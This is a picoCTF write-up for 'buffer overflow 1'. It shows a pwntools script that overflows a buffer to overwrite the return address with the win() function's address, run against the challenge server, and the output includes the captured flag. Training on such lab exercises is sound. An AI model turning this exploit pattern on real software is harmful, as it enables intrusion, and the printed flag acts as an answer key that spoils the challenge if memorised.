## Objetivo
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln). You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using `nc saturn.picoctf.net 59762`

## Solución
```bash
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/bufferoverflow1]
└─$ cat script.py 
from pwn import *
context.binary = elf = ELF("./vuln", checksec=False)
p = process()
p = remote("saturn.picoctf.net", 57476)

p.recv()
offset = cyclic_find(0x6161616c)
addr_win = elf.sym.win
payload = b""
payload += b"A" * offset
payload += p32(addr_win)
p.sendline(payload)
p.interactive()
```

```bash
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/bufferoverflow1]
└─$ ls      
flag.txt  script.py  vuln  vuln.c
                                                                             
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/bufferoverflow1]
└─$ python script.py        
[x] Starting local process '/home/kali/picoCTFretos/Binexp/bufferoverflow1/vu[q] Starting local process '/home/kali/picoCTFretos/Binexp/bufferoverflow1/vu[+]  pid 10844
[▄] Opening connection to saturn.picoctf.net on port 57476: Trying 13.59.203.[+] Opening connection to saturn.picoctf.net on port 57476: Done
[*] Switching to interactive mode
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
$ 
```

